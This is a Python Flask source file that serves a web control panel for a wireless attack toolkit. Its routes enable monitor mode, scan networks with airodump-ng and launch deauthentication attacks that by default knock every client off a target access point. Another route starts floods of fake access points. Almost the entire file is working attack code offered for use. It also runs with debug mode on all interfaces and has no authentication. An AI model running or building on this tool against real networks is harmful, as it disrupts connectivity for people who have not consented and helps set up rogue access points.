import os
import subprocess
import re
import glob
import time
from flask import Flask, render_template, request, jsonify
from silver import (
    get_network_interfaces,
    start_monitor_mode,
    stop_monitor_mode,
    run_airodump,
    run_deauth,
    create_fake_ap_list,
    start_fake_ap,
    stop_fake_ap,
    get_running_fake_aps
)

app = Flask(__name__)

MONITOR_INTERFACE = None
FAKE_AP_PROCESS = None

@app.route('/')
def index():
    interfaces = get_network_interfaces()
    return render_template('index.html', interfaces=interfaces, monitor_interface=MONITOR_INTERFACE)

@app.route('/start_monitor', methods=['POST'])
def start_monitor():
    global MONITOR_INTERFACE
    interface = request.form['interface']
    result, error = start_monitor_mode(interface)
    if result:
        MONITOR_INTERFACE = result
        return jsonify({'success': True, 'message': f'Monitor mode started on {MONITOR_INTERFACE}', 'monitor_interface': MONITOR_INTERFACE})
    else:
        return jsonify({'success': False, 'error': error})

@app.route('/stop_monitor')
def stop_monitor():
    global MONITOR_INTERFACE, FAKE_AP_PROCESS
    if not MONITOR_INTERFACE:
        return jsonify({'success': False, 'error': 'Monitor mode is not active.'})
    
    if FAKE_AP_PROCESS:
        stop_fake_ap()
        FAKE_AP_PROCESS = None
    
    result, error = stop_monitor_mode(MONITOR_INTERFACE)
    if result:
        MONITOR_INTERFACE = None
        return jsonify({'success': True, 'message': 'Monitor mode stopped.'})
    else:
        return jsonify({'success': False, 'error': error})

@app.route('/scan_networks')
def scan_networks():
    global MONITOR_INTERFACE
    if not MONITOR_INTERFACE:
        return jsonify({'success': False, 'error': 'Monitor mode must be active to scan.'})
    
    try:
        networks = run_airodump(MONITOR_INTERFACE)
        if not networks:
            return jsonify({'success': False, 'error': 'No networks found or scan failed.'})
        return jsonify({'success': True, 'networks': networks})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/get_ap_channel', methods=['POST'])
def get_ap_channel():
    global MONITOR_INTERFACE
    if not MONITOR_INTERFACE:
        return jsonify({'success': False, 'error': 'Monitor mode must be active'})
    
    target_bssid = request.form.get('bssid')
    if not target_bssid:
        return jsonify({'success': False, 'error': 'BSSID is required'})
    
    try:
        cmd = ['sudo', 'airodump-ng', '--bssid', target_bssid, 
               '--channel', '1-14', '--write', 'temp_scan', 
               MONITOR_INTERFACE]
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(5)
        process.terminate()
        
        channel = None
        if os.path.exists('temp_scan-01.csv'):
            with open('temp_scan-01.csv', 'r') as f:
                for line in f:
                    if target_bssid.lower() in line.lower():
                        parts = line.split(',')
                        if len(parts) > 5:
                            channel = parts[5].strip()
                            break
        
        if channel:
            subprocess.run(['sudo', 'iwconfig', MONITOR_INTERFACE, 'channel', channel],
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return jsonify({'success': True, 'channel': channel})
        else:
            return jsonify({'success': False, 'error': 'Could not determine channel'})
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
    finally:
        for f in glob.glob('temp_scan*'):
            try:
                os.remove(f)
            except:
                pass

@app.route('/deauth_attack', methods=['POST'])
def deauth_attack():
    global MONITOR_INTERFACE
    if not MONITOR_INTERFACE:
        return jsonify({'success': False, 'error': 'Monitor mode must be active for deauth attack.'})

    target_bssid = request.form['bssid']
    target_mac = request.form.get('target_mac', 'ff:ff:ff:ff:ff:ff')
    num_packets = request.form.get('packets', '100')
    channel = request.form.get('channel', '')
    
    if not target_bssid or not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', target_bssid):
        return jsonify({'success': False, 'error': 'Invalid BSSID format'})
    
    if target_mac != 'ff:ff:ff:ff:ff:ff' and not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', target_mac):
        return jsonify({'success': False, 'error': 'Invalid target MAC format'})
    
    try:
        num_packets = int(num_packets)
        if num_packets <= 0:
            return jsonify({'success': False, 'error': 'Packet count must be positive'})
    except ValueError:
        return jsonify({'success': False, 'error': 'Invalid packet count'})
    
    result, message = run_deauth(MONITOR_INTERFACE, target_bssid, target_mac, int(num_packets), channel)
    
    if result:
        return jsonify({'success': True, 'message': message})
    else:
        return jsonify({'success': False, 'error': message})

@app.route('/start_fake_ap', methods=['POST'])
def start_fake_ap_route():
    global MONITOR_INTERFACE, FAKE_AP_PROCESS
    if not MONITOR_INTERFACE:
        return jsonify({'success': False, 'error': 'Monitor mode must be active for fake AP.'})
    
    ap_names = request.form.get('ap_names', '').strip()
    if not ap_names:
        return jsonify({'success': False, 'error': 'Please enter at least one AP name'})
    
    ap_list = [name.strip() for name in ap_names.split('\n') if name.strip()]
    if not ap_list:
        return jsonify({'success': False, 'error': 'No valid AP names provided'})
    
    filename = 'fake_ap_list.lst'
    success, error = create_fake_ap_list(filename, ap_list)
    if not success:
        return jsonify({'success': False, 'error': error})
    
    process, error = start_fake_ap(MONITOR_INTERFACE, filename)
    if error:
        return jsonify({'success': False, 'error': error})
    
    FAKE_AP_PROCESS = process
    return jsonify({
        'success': True,
        'message': f'Started {len(ap_list)} fake APs',
        'ap_list': ap_list
    })

@app.route('/stop_fake_ap')
def stop_fake_ap_route():
    global FAKE_AP_PROCESS
    success, error = stop_fake_ap()
    if success:
        FAKE_AP_PROCESS = None
        return jsonify({'success': True, 'message': 'Stopped all fake APs'})
    else:
        return jsonify({'success': False, 'error': error or 'Failed to stop fake APs'})

@app.route('/fake_ap_status')
def fake_ap_status():
    aps = get_running_fake_aps()
    return jsonify({
        'success': True,
        'running': len(aps) > 0,
        'processes': aps
    })

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
